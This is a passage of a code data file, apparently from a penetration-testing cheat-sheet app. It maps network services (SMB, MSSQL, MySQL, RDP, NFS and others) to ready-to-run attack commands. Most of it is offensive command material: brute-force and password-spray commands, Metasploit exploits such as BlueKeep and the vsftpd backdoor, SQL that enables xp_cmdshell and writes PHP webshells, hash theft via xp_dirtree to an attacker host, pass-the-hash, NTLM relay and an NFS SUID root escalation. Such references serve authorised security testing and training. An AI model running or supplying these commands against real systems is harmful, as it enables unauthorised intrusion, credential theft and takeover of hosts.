            commands: [{ label: 'Map', code: 'smbmap -H <TARGET> -u <USER> -p <PASS>' }]
        },
        {
            name: 'Enum4Linux',
            description: 'Full Enum',
            commands: [{ label: 'Run', code: 'enum4linux -a <TARGET>' }]
        },
        {
            name: 'CrackMapExec',
            description: 'Network Enum',
            commands: [{ label: 'Check', code: 'nxc smb <TARGET> -u <USER> -p <PASS>' }]
        }
    ]
  },
  {
    port: 623,
    protocol: 'UDP',
    name: 'IPMI',
    description: 'Intelligent Platform Management Interface',
    whatToLookFor: [
      'Default Credentials: ADMIN/ADMIN, root/calvin.',
      'Cipher Zero: Authentication bypass allowing access.',
      'Version Info: Identifying BMC version.',
      'Hash Dumping: Retrieving user hashes for offline cracking (RAKP protocol).'
    ],
    tools: [
        {
            name: 'Metasploit',
            description: 'Version Scan',
            commands: [{ label: 'Version', code: 'msfconsole -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS <TARGET>; run"' }]
        },
        {
            name: 'Ipmitool',
            description: 'Manual Interaction',
            commands: [{ label: 'User List', code: 'ipmitool -I lanplus -H <TARGET> -U <USER> -P <PASS> user list' }]
        },
        {
            name: 'Nmap',
            description: 'IPMI Scripts',
            commands: [{ label: 'Enum', code: 'nmap -sU --script ipmi-version,ipmi-cipher-zero -p 623 <TARGET>' }]
        }
    ]
  },
  {
    port: 873,
    protocol: 'TCP',
    name: 'Rsync',
    description: 'Remote File Copy',
    whatToLookFor: [
      'Anonymous Access: Modules that do not require auth.',
      'Writable Modules: Ability to upload files (SSH keys, cron jobs).',
      'Sensitive Files: Downloading source code, backups, /etc/shadow.',
      'Brute Force: Weak passwords on protected modules.'
    ],
    tools: [
        {
            name: 'Rsync Client',
            description: 'List Modules',
            commands: [{ label: 'List', code: 'rsync -rdt rsync://<TARGET>/' }]
        },
        {
            name: 'Nmap',
            description: 'Rsync Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 873 --script rsync-list-modules <TARGET>' }]
        }
    ]
  },
  {
    port: 1433,
    protocol: 'TCP',
    name: 'MSSQL',
    description: 'Microsoft SQL Server',
    whatToLookFor: [
      'Default Credentials: sa / password (rare but possible).',
      'XP_CMDSHELL: Is it enabled? Allows RCE.',
      'Authentication: Windows Auth vs SQL Auth.',
      'Linked Servers: Pivoting to other database instances.',
      'Impersonation: Can you execute as another user (sa)?'
    ],
    tools: [
        {
            name: 'Impacket',
            description: 'MSSQL Client',
            commands: [{ label: 'Connect', code: 'impacket-mssqlclient <USER>:<PASS>@<TARGET>' }]
        },
        {
            name: 'Sqsh',
            description: 'T-SQL Client',
            commands: [
                { label: 'Connect', code: 'sqsh -S <TARGET> -U <USER> -P \'<PASS>\' -h' },
                { label: 'Win Auth', code: 'sqsh -S <TARGET> -U .\\\\<USER> -P \'<PASS>\' -h' }
            ]
        },
        {
            name: 'Nmap',
            description: 'MSSQL Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell <TARGET>' }]
        },
        {
            name: 'Hydra',
            description: 'Brute Force',
            commands: [{ label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> mssql' }]
        }
    ]
  },
  {
    port: 1521,
    protocol: 'TCP',
    name: 'Oracle',
    description: 'Oracle Database',
    whatToLookFor: [
      'SID Enumeration: Guessing valid SIDs (XE, ORCL, etc.).',
      'Default Credentials: scott/tiger, system/manager.',
      'TNS Listener: Checking version and status.',
      'RCE: Java stored procedures, external tables.'
    ],
    tools: [
        {
            name: 'ODAT',
            description: 'Oracle Database Attacking Tool',
            commands: [{ label: 'SidGuesser', code: 'odat sidguesser -s <TARGET>' }]
        },
        {
            name: 'Nmap',
            description: 'Oracle Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 1521 --script oracle-sid-brute <TARGET>' }]
        }
    ]
  },
  {
    port: 2049,
    protocol: 'TCP',
    name: 'NFS',
    description: 'Network File System',
    whatToLookFor: [
      'Showmount: Listing available exports.',
      'No Root Squash: Can you mount as root and write files as root?',
      'Access Controls: Are exports restricted by IP?',
      'Sensitive Data: Searching mounted shares for secrets.'
    ],
    tools: [
        {
            name: 'Showmount',
            description: 'Show Exports',
            commands: [{ label: 'List', code: 'showmount -e <TARGET>' }]
        },
        {
            name: 'Mount',
            description: 'Mount Share',
            commands: [{ label: 'Mount', code: 'mkdir /tmp/nfs && sudo mount -t nfs <TARGET>:/share /tmp/nfs' }]
        }
    ]
  },
  {
    port: 3306,
    protocol: 'TCP',
    name: 'MySQL',
    description: 'MySQL Database',
    whatToLookFor: [
      'Default Credentials: root/root, root/mysql, root/password.',
      'Unauthenticated Access: Is root allowed from localhost only or anywhere?',
      'Version Exploit: UDF (User Defined Functions) for RCE.',
      'File Read/Write: LOAD_FILE(), SELECT INTO OUTFILE.'
    ],
    tools: [
        {
            name: 'MySQL Client',
            description: 'Connect',
            commands: [{ label: 'Connect', code: 'mysql -h <TARGET> -u root -p' }]
        },
        {
            name: 'Nmap',
            description: 'MySQL Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 3306 --script mysql-enum,mysql-empty-password <TARGET>' }]
        },
        {
            name: 'Hydra',
            description: 'Brute Force',
            commands: [{ label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> mysql' }]
        }
    ]
  },
  {
    port: 3389,
    protocol: 'TCP',
    name: 'RDP',
    description: 'Remote Desktop Protocol',
    whatToLookFor: [
      'BlueKeep: CVE-2019-0708 (RCE without auth).',
      'Weak Credentials: Valid user accounts with bad passwords.',
      'NLA: Network Level Authentication (requires creds to connect).',
      'User Enumeration: Analyzing error messages or timing.'
    ],
    tools: [
        {
            name: 'xfreerdp',
            description: 'RDP Client',
            commands: [{ label: 'Connect', code: 'xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>' }]
        },
        {
            name: 'Nmap',
            description: 'RDP Scripts',
            commands: [{ label: 'Vuln Check', code: 'nmap -p 3389 --script rdp-vuln-ms12-020,rdp-enum-encryption <TARGET>' }]
        },
        {
            name: 'Hydra',
            description: 'Brute Force',
            commands: [{ label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> rdp://<TARGET>' }]
        }
    ]
  },
  {
    port: 5432,
    protocol: 'TCP',
    name: 'PostgreSQL',
    description: 'PostgreSQL Database',
    whatToLookFor: [
      'Default Credentials: postgres/postgres.',
      'RCE: COPY command to read/write files, or extensions.',
      'Version Info: Identifying specific version for CVEs.',
      'Trust Auth: Allowed to connect without password from certain IPs?'
    ],
    tools: [
        {
            name: 'Psql',
            description: 'Client',
            commands: [{ label: 'Connect', code: 'psql -h <TARGET> -U postgres' }]
        },
        {
            name: 'Hydra',
            description: 'Brute Force',
            commands: [{ label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> postgres' }]
        }
    ]
  },
  {
    port: 5900,
    protocol: 'TCP',
    name: 'VNC',
    description: 'Virtual Network Computing',
    whatToLookFor: [
      'No Authentication: Connect directly to the desktop.',
      'Weak Passwords: VNC passwords are often short (des).',
      'Version Info: RealVNC, UltraVNC, TightVNC exploits.'
    ],
    tools: [
        {
            name: 'VNC Viewer',
            description: 'Connect',
            commands: [{ label: 'Connect', code: 'vncviewer <TARGET>:5900' }]
        },
        {
            name: 'Nmap',
            description: 'VNC Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 5900 --script vnc-info,vnc-brute <TARGET>' }]
        }
    ]
  },
  {
    port: 5985,
    protocol: 'TCP',
    name: 'WinRM',
    description: 'Windows Remote Management',
    whatToLookFor: [
      'Authentication: Requires valid credentials.',
      'PowerShell Remoting: Gaining a shell on Windows.',
      'Brute Force: Password spraying against valid users.'
    ],
    tools: [
        {
            name: 'Evil-WinRM',
            description: 'WinRM Shell',
            commands: [{ label: 'Connect', code: 'evil-winrm -i <TARGET> -u <USER> -p <PASS>' }]
        },
        {
            name: 'CrackMapExec',
            description: 'WinRM Check',
            commands: [{ label: 'Check', code: 'nxc winrm <TARGET> -u <USER> -p <PASS>' }]
        }
    ]
  },
  {
    port: 6379,
    protocol: 'TCP',
    name: 'Redis',
    description: 'In-memory Data Store',
    whatToLookFor: [
      'Unauthenticated Access: No password set.',
      'File Write RCE: Writing SSH keys or webshells via CONFIG SET.',
      'Information Disclosure: Dumping database content.'
    ],
    tools: [
        {
            name: 'Redis CLI',
            description: 'Connect',
            commands: [{ label: 'Connect', code: 'redis-cli -h <TARGET>' }]
        },
        {
            name: 'Nmap',
            description: 'Redis Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 6379 --script redis-info <TARGET>' }]
        }
    ]
  },
  {
    port: 8080,
    protocol: 'TCP',
    name: 'HTTP-Alt',
    description: 'Alternative Web Port',
    whatToLookFor: [
      'Tomcat Manager: Default creds (tomcat/s3cret).',
      'Jenkins: Script console RCE, unauth access.',
      'Proxy Servers: Open proxy usage.',
      'Web Apps: Testing/Dev environments often hosted here.'
    ],
    tools: [
        {
            name: 'Nikto',
            description: 'Scan',
            commands: [{ label: 'Scan', code: 'nikto -h http://<TARGET>:8080' }]
        },
        {
            name: 'Gobuster',
            description: 'Dir Bust',
            commands: [{ label: 'Scan', code: 'gobuster dir -u http://<TARGET>:8080 -w <WORDLIST>' }]
        }
    ]
  },
  {
    port: 9200,
    protocol: 'TCP',
    name: 'Elasticsearch',
    description: 'Search Engine Database',
    whatToLookFor: [
      'Unauthenticated Access: Querying data without auth.',
      'RCE: Older versions had Groovy scripting vulnerabilities.',
      'Information Disclosure: Dumping indices containing logs/creds.',
      'Cluster Status: Checking health and node info.'
    ],
    tools: [
        {
            name: 'Curl',
            description: 'Manual Query',
            commands: [
                { label: 'Health', code: 'curl http://<TARGET>:9200/_cat/health?v' },
                { label: 'Indices', code: 'curl http://<TARGET>:9200/_cat/indices?v' },
                { label: 'Nodes', code: 'curl http://<TARGET>:9200/_cat/nodes?v' }
            ]
        },
        {
            name: 'Nmap',
            description: 'Elastic Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 9200 --script elasticsearch*' }]
        }
    ]
  },
  {
    port: 11211,
    protocol: 'TCP',
    name: 'Memcached',
    description: 'Distributed Memory Object Caching',
    whatToLookFor: [
      'Unauthenticated Access: Dumping cache data.',
      'Cached Data: Looking for database queries, sessions, passwords.',
      'UDP Amplification: Is UDP port 11211 open?'
    ],
    tools: [
        {
            name: 'Netcat',
            description: 'Manual Interaction',
            commands: [
                { label: 'Stats', code: 'echo stats | nc -vn <TARGET> 11211' },
                { label: 'Items', code: 'echo stats items | nc -vn <TARGET> 11211' },
                { label: 'Dump Slabs', code: 'echo stats slabs | nc -vn <TARGET> 11211' }
            ]
        },
        {
            name: 'Nmap',
            description: 'Memcached Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 11211 --script memcached-info <TARGET>' }]
        }
    ]
  },
  {
    port: 27017,
    protocol: 'TCP',
    name: 'MongoDB',
    description: 'NoSQL Database',
    whatToLookFor: [
      'No Authentication: Connecting without credentials.',
      'Data Dump: Dumping collections and documents.',
      'Web Interfaces: Some versions expose a web console.',
      'NoSQL Injection: In web apps using Mongo.'
    ],
    tools: [
        {
            name: 'Mongo Shell',
            description: 'Connect',
            commands: [{ label: 'Connect', code: 'mongo <TARGET>:27017' }]
        },
        {
            name: 'Nmap',
            description: 'Mongo Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 27017 --script mongodb-info,mongodb-databases <TARGET>' }]
        }
    ]
  }
];

export const SERVICE_EXPLOITS: ExploitTopic[] = [
  {
     id: 'exploit-ftp',
     name: 'FTP (21)',
     icon: 'fa-folder-open',
     description: 'Exploiting File Transfer Protocol.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'User List', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> ftp' },
           { label: 'Single User', code: 'hydra -l <USER> -P <PASS_LIST> -f <TARGET> ftp' }
         ]
       },
       {
         name: 'Metasploit',
         description: 'Common Exploits',
         commands: [
             { label: 'vsftpd 2.3.4', code: 'msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <TARGET>; run"' },
             { label: 'ProFTPD', code: 'searchsploit proftpd' }
         ]
       }
     ],
     whatToLookFor: [
       'Default/Weak Creds: admin/admin, anonymous access.',
       'Vulnerable Versions: vsftpd 2.3.4 (Backdoor), ProFTPD 1.3.5 (mod_copy).',
       'Writable Directories: Uploading webshells to web roots.',
       'FTP Bounce: Nmap bounce scan capability.'
     ]
  },
  {
     id: 'exploit-ssh',
     name: 'SSH (22)',
     icon: 'fa-terminal',
     description: 'Exploiting Secure Shell.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'User List', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> ssh' },
           { label: 'With Key', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -M <KEY_FILE> ssh://<TARGET>' }
         ]
       },
       {
         name: 'Metasploit',
         description: 'libssh Auth Bypass',
         commands: [{ label: 'Exploit', code: 'msfconsole -x "use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS <TARGET>; run"' }]
       }
     ],
     whatToLookFor: [
       'Weak Passwords: root/root, user/user.',
       'Key Reuse: Finding id_rsa files on other compromised hosts.',
       'Old Versions: libssh auth bypass (CVE-2018-10933).',
       'User Enum: Timing attacks to identify valid users.'
     ]
  },
  {
     id: 'exploit-telnet',
     name: 'Telnet (23)',
     icon: 'fa-tty',
     description: 'Exploiting Telnet.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'User List', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> telnet' }
         ]
       },
       {
           name: 'Credential Sniffing',
           description: 'Traffic Analysis',
           commands: [{ label: 'Tcpdump', code: 'sudo tcpdump -i <INTERFACE> port 23 -A' }]
       }
     ],
     whatToLookFor: [
       'MITM: Sniffing credentials on the wire.',
       'Weak Creds: Brute forcing is trivial.',
       'Privilege Escalation: Telnet often runs as root on embedded devices.'
     ]
  },
  {
     id: 'exploit-smtp',
     name: 'SMTP (25)',
     icon: 'fa-envelope',
     description: 'Exploiting Mail Services.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'User List', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> smtp' }
         ]
       },
       {
           name: 'Enumerate & Attack',
           description: 'User Enumeration',
           commands: [{ label: 'Smtp-user-enum', code: 'smtp-user-enum -M VRFY -U <USER_LIST> -t <TARGET>' }]
       }
     ],
     whatToLookFor: [
       'Open Relay: Sending phishing emails from trusted domain.',
       'User Enum: VRFY/EXPN commands revealing valid users.',
       'Haraka RCE: CVE-2016-10033 (Command Injection).',
       'James SMTP: RCE vulnerabilities.'
     ]
  },
  {
     id: 'exploit-http',
     name: 'HTTP/HTTPS (80/443)',
     icon: 'fa-globe',
     description: 'Web Application Exploitation.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Form/Basic Auth Attacks',
         commands: [
           { label: 'Basic Auth', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> http-get /admin' },
           { label: 'Form Post', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"' }
         ]
       },
       {
         name: 'Exploitation Tools',
         description: 'Automated Exploitation',
         commands: [
             { label: 'SQLMap', code: 'sqlmap -u "<URL>" --batch --dbs' },
             { label: 'WPScan', code: 'wpscan --url <URL> --passwords <PASS_LIST> --usernames <USER_LIST>' },
             { label: 'Shellshock', code: 'msfconsole -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS <TARGET>; set TARGETURI /cgi-bin/test.cgi; run"' }
         ]
       },
       {
           name: 'Tomcat/Jenkins',
           description: 'Manager/Script Console',
           commands: [
               { label: 'Tomcat Hydra', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> http-get /manager/html' },
               { label: 'Jenkins Script', code: 'println "whoami".execute().text' }
           ]
       }
     ],
     whatToLookFor: [
       'SQL Injection: Input fields, URL parameters.',
       'RCE: File uploads, command injection.',
       'LFI/RFI: Including local/remote files via parameters.',
       'Default Creds: Admin panels (Tomcat, Jenkins, CMS).',
       'Known CVEs: Shellshock, Struts, Heartbleed.'
     ]
  },
  {
     id: 'exploit-pop3-imap',
     name: 'POP3/IMAP (110/143)',
     icon: 'fa-mail-bulk',
     description: 'Mail Retrieval Exploitation.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'POP3', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> pop3' },
           { label: 'IMAP', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> imap' }
         ]
       }
     ],
     whatToLookFor: [
       'Weak Passwords: Brute forcing user accounts.',
       'Version Exploits: Buffer overflows in older mail servers.',
       'Information Leakage: Reading sensitive emails.'
     ]
  },
  {
     id: 'exploit-smb',
     name: 'SMB (139/445)',
     icon: 'fa-network-wired',
     description: 'Exploiting Windows Shares/Services.',
     tools: [
       {
         name: 'Null Session/Enum',
         description: 'Anonymous Access',
         commands: [
           { label: 'Smbclient (Null)', code: 'smbclient -N -L //<TARGET>' },
           { label: 'Smbmap (Recursive)', code: 'smbmap -H <TARGET> -R' },
           { label: 'Smbmap (Download)', code: 'smbmap -H <TARGET> --download "<SHARE>\\file.txt"' },
           { label: 'Smbmap (Upload)', code: 'smbmap -H <TARGET> --upload test.txt "<SHARE>\\test.txt"' },
           { label: 'Rpcclient', code: 'rpcclient -U "" <TARGET>' },
           { label: 'Enum4linux-ng', code: 'enum4linux-ng -A <TARGET>' }
         ]
       },
       {
         name: 'Password Spray',
         description: 'NetExec Spraying',
         commands: [
           { label: 'Spray Users', code: 'nxc smb <TARGET> -u <USER_LIST> -p <PASS> --local-auth' },
           { label: 'Continue Success', code: 'nxc smb <TARGET> -u <USER_LIST> -p <PASS> --continue-on-success' }
         ]
       },
       {
         name: 'Remote Code Execution',
         description: 'Impacket & NetExec',
         commands: [
             { label: 'PsExec', code: 'impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>' },
             { label: 'SmbExec', code: 'impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>' },
             { label: 'NetExec CMD', code: 'nxc smb <TARGET> -u <USER> -p <PASS> -x "whoami" --exec-method smbexec' },
             { label: 'NetExec PowerShell', code: 'nxc smb <TARGET> -u <USER> -p <PASS> -X "whoami"' }
         ]
       },
       {
         name: 'Post-Exploitation',
         description: 'Dumping & Hashes',
         commands: [
             { label: 'Dump SAM', code: 'nxc smb <TARGET> -u <USER> -p <PASS> --sam' },
             { label: 'Logged-on Users', code: 'nxc smb <TARGET> -u <USER> -p <PASS> --loggedon-users' },
             { label: 'Pass-the-Hash', code: 'nxc smb <TARGET> -u <USER> -H <HASH>' }
         ]
       },
       {
         name: 'Relay & Capture',
         description: 'Responder & NTLMRelayx',
         commands: [
             { label: 'Responder', code: 'responder -I <INTERFACE>' },
             { label: 'Relay Attack', code: 'impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET> -c "whoami"' }
         ]
       },
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'User List', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> smb' }
         ]
       }
     ],
     whatToLookFor: [
       'EternalBlue (MS17-010): RCE via SMBv1 buffer overflow.',
       'Null Sessions: Listing users/shares without auth.',
       'Weak Permissions: Writable shares (upload malware/webshells).',
       'SMB Relay: Signing disabled allows relaying credentials.',
       'Pass-the-Hash: Reusing NTLM hashes for authentication.',
       'Sensitive Files: Searching shares for passwords/config files.'
     ]
  },
  {
     id: 'exploit-snmp',
     name: 'SNMP (161)',
     icon: 'fa-project-diagram',
     description: 'Simple Network Management Protocol.',
     tools: [
       {
         name: 'Brute Force',
         description: 'Community String Guessing',
         commands: [
           { label: 'Hydra', code: 'hydra -P <PASS_LIST> <TARGET> snmp' },
           { label: 'Onesixtyone', code: 'onesixtyone -c <PASS_LIST> <TARGET>' }
         ]
       },
       {
           name: 'Exploitation',
           description: 'Write Access',
           commands: [{ label: 'Set Value', code: 'snmpset -v 1 -c <COMMUNITY> <TARGET> <OID> <TYPE> <VALUE>' }]
       }
     ],
     whatToLookFor: [
       'Public Community String: Read system info, processes, etc.',
       'Private Community String: Write access (RCE potential).',
       'Extension Attacks: MIBs that allow command execution.',
       'Information Leakage: Usernames, emails, network topology.'
     ]
  },
  {
     id: 'exploit-rsync',
     name: 'Rsync (873)',
     icon: 'fa-sync',
     description: 'Rsync Exploitation.',
     tools: [
       {
         name: 'Access',
         description: 'File Upload/Download',
         commands: [
           { label: 'Download', code: 'rsync -av rsync://<TARGET>/<PATH> ./local_copy' },
           { label: 'Upload', code: 'rsync -av local_file rsync://<TARGET>/<PATH>/' }
         ]
       },
       {
           name: 'Hydra',
           description: 'Brute Force',
           commands: [{ label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> rsync://<TARGET>' }]
       }
     ],
     whatToLookFor: [
       'Anonymous RW Access: Uploading SSH keys to /root/.ssh/ or webshells to /var/www/html.',
       'Sensitive Data: Downloading /etc/shadow or source code.',
       'Misconfigurations: Modules mapped to root of filesystem.'
     ]
  },
  {
     id: 'exploit-mssql',
     name: 'MSSQL (1433)',
     icon: 'fa-database',
     description: 'Microsoft SQL Server Exploitation.',
     tools: [
       {
         name: 'Connection',
         description: 'Connect to MSSQL',
         commands: [
           { label: 'Impacket', code: 'impacket-mssqlclient -p 1433 <USER>@<TARGET>' },
           { label: 'Sqsh (Linux)', code: 'sqsh -S <TARGET> -U <USER> -P \'<PASS>\' -h' },
           { label: 'Sqsh (Win Auth)', code: 'sqsh -S <TARGET> -U .\\\\<USER> -P \'<PASS>\' -h' },
           { label: 'Sqlcmd (Windows)', code: 'sqlcmd -S <TARGET> -U <USER> -P \'<PASS>\' -y 30 -Y 30' }
         ]
       },
       {
         name: 'Enumeration',
         description: 'Discovery Queries',
         commands: [
           { label: 'List DBs', code: 'SELECT name FROM master.dbo.sysdatabases; GO' },
           { label: 'Select DB', code: 'USE <DB>; GO' },
           { label: 'List Tables', code: 'SELECT table_name FROM <DB>.INFORMATION_SCHEMA.TABLES; GO' },
           { label: 'Current User', code: 'SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(\'sysadmin\'); GO' }
         ]
       },
       {
         name: 'Command Execution',
         description: 'xp_cmdshell',
         commands: [
           { label: 'Enable xp_cmdshell', code: 'EXECUTE sp_configure \'show advanced options\', 1; RECONFIGURE; EXECUTE sp_configure \'xp_cmdshell\', 1; RECONFIGURE; GO' },
           { label: 'Execute Command', code: 'xp_cmdshell \'whoami\'; GO' }
         ]
       },
       {
         name: 'File Operations',
         description: 'Read/Write Files',
         commands: [
           { label: 'Read File', code: 'SELECT * FROM OPENROWSET(BULK N\'C:/Windows/System32/drivers/etc/hosts\', SINGLE_CLOB) AS Contents; GO' },
           { label: 'Enable Ole', code: 'sp_configure \'show advanced options\', 1; RECONFIGURE; sp_configure \'Ole Automation Procedures\', 1; RECONFIGURE; GO' },
           { label: 'Write File', code: 'DECLARE @OLE INT; DECLARE @FileID INT; EXECUTE sp_OACreate \'Scripting.FileSystemObject\', @OLE OUT; EXECUTE sp_OAMethod @OLE, \'OpenTextFile\', @FileID OUT, \'c:\\inetpub\\wwwroot\\webshell.php\', 8, 1; EXECUTE sp_OAMethod @FileID, \'WriteLine\', Null, \'<?php echo shell_exec($_GET["c"]);?>\'; EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE; GO' }
         ]
       },
       {
         name: 'Lateral Movement',
         description: 'Hash Stealing & Impersonation',
         commands: [
           { label: 'Steal Hash (xp_dirtree)', code: 'EXEC master..xp_dirtree \'\\\\<LHOST>\\share\\\'; GO' },
           { label: 'Identify Impersonation', code: 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = \'IMPERSONATE\'; GO' },
           { label: 'Impersonate SA', code: 'EXECUTE AS LOGIN = \'sa\'; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(\'sysadmin\'); GO' }
         ]
       },
       {
         name: 'Linked Servers',
         description: 'Cross-Database Attacks',
         commands: [
           { label: 'Identify Linked', code: 'SELECT srvname, isremote FROM sysservers; GO' },
           { label: 'Execute AT', code: 'EXECUTE(\'select @@servername, @@version, system_user, is_srvrolemember(\'\'sysadmin\'\')\') AT [<LINKED_SERVER>]' }
         ]
       },
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'User List', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> mssql' }
         ]
       }
     ],
     whatToLookFor: [
       'Weak Passwords: sa/password, admin/admin.',
       'xp_cmdshell: Direct command execution on the host.',
       'Linked Servers: Pivoting to other servers (often on high privs).',
       'Impersonation: Escalating from low priv user to sysadmin.',
       'Hash Stealing: Forcing NTLM auth to attacker machine via xp_dirtree.'
     ]
  },
  {
     id: 'exploit-oracle',
     name: 'Oracle (1521)',
     icon: 'fa-database',
     description: 'Oracle Database.',
     tools: [
       {
         name: 'ODAT',
         description: 'Oracle Database Attacking Tool',
         commands: [
           { label: 'Password Guesser', code: 'odat passwordguesser -s <TARGET> -d <DB> --accounts-file accounts/accounts_multiple.txt' },
           { label: 'UTL_FILE RCE', code: 'odat utlfile -s <TARGET> -d <DB> -U <USER> -P <PASS> --putFile C:\\inetpub\\wwwroot shell.jsp shell.jsp' }
         ]
       }
     ],
     whatToLookFor: [
       'Default Accounts: scott, system, sys, dbsnmp.',
       'SID Brute Force: Finding valid instances.',
       'RCE: Java stored procedures, external tables, UTL_FILE.',
       'Privilege Escalation: Exploiting PL/SQL injection.'
     ]
  },
  {
     id: 'exploit-nfs',
     name: 'NFS (2049)',
     icon: 'fa-network-wired',
     description: 'Network File System.',
     tools: [
       {
         name: 'Mounting',
         description: 'Accessing Shares',
         commands: [
           { label: 'Mount Share', code: 'mkdir /tmp/nfs; sudo mount -t nfs <TARGET>:/<PATH> /tmp/nfs' },
           { label: 'Unmount', code: 'sudo umount /tmp/nfs' }
         ]
       },
       {
           name: 'Permissions',
           description: 'Root Squashing',
           commands: [
               { label: 'Check Write', code: 'touch /tmp/nfs/test_write' },
               { label: 'SUID Bit', code: 'cp /bin/bash /tmp/nfs/bash; chmod +s /tmp/nfs/bash' }
           ]
       }
     ],
     whatToLookFor: [
       'No Root Squash: If enabled, mounting as root gives root on remote system.',
       'Writable Shares: Uploading payloads or modifying authorized_keys.',
       'Sensitive Files: Backups, home directories, configuration files.'
     ]
  },
  {
     id: 'exploit-mysql',
     name: 'MySQL (3306)',
     icon: 'fa-database',
     description: 'MySQL Database Exploitation.',
     tools: [
       {
         name: 'Connection',
         commands: [
           { label: 'Connect', code: 'mysql -u <USER> -p<PASS> -h <TARGET>' }
         ]
       },
       {
         name: 'Enumeration',
         commands: [
           { label: 'Show DBs', code: 'SHOW DATABASES;' },
           { label: 'Use DB', code: 'USE <DB>;' },
           { label: 'Show Tables', code: 'SHOW TABLES;' },
           { label: 'Dump Table', code: 'SELECT * FROM users;' }
         ]
       },
       {
         name: 'File Operations',
         commands: [
           { label: 'Check Privs', code: 'show variables like "secure_file_priv";' },
           { label: 'Write Shell', code: 'SELECT "<?php echo shell_exec($_GET[\'c\']);?>" INTO OUTFILE \'/var/www/html/webshell.php\';' },
           { label: 'Read File', code: 'select LOAD_FILE("/etc/passwd");' }
         ]
       },
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'User List', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> mysql' }
         ]
       },
       {
           name: 'Exploitation',
           description: 'UDF Injection',
           commands: [{ label: 'UDF Exploit', code: 'Use SearchSploit: searchsploit mysql udf' }]
       }
     ],
     whatToLookFor: [
       'Weak Passwords: root/root, root/mysql.',
       'UDF Injection: Loading shared libraries for RCE.',
       'File Write: Writing webshells if secure_file_priv is empty.',
       'File Read: Reading /etc/passwd or config files.'
     ]
  },
  {
     id: 'exploit-rdp',
     name: 'RDP (3389)',
     icon: 'fa-desktop',
     description: 'Remote Desktop Protocol.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'User List', code: 'hydra -L <USER_LIST> -P <PASS_LIST> rdp://<TARGET>' }
         ]
       },
       {
         name: 'Metasploit BlueKeep',
         description: 'CVE-2019-0708',
         commands: [{ label: 'Exploit', code: 'msfconsole -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS <TARGET>; run"' }]
       }
     ],
     whatToLookFor: [
       'BlueKeep: Critical RCE on older Windows (7, 2008).',
       'Weak Credentials: Valid accounts with simple passwords.',
       'Session Hijacking: tscon.exe attacks (requires local admin).'
     ]
  },
  {
     id: 'exploit-postgres',
     name: 'PostgreSQL (5432)',
     icon: 'fa-database',
     description: 'PostgreSQL Database.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'User List', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> postgres' }
         ]
       },
       {
           name: 'RCE',
           description: 'Code Execution',
           commands: [{ label: 'Metasploit', code: 'use exploit/linux/postgres/postgres_payload' }]
       }
     ],
     whatToLookFor: [
       'Default Creds: postgres/postgres.',
       'RCE: COPY command execution (CVE-2019-9193).',
       'File Write: Lo_export for writing files.',
       'Trust Authentication: Check pg_hba.conf misconfigurations.'
     ]
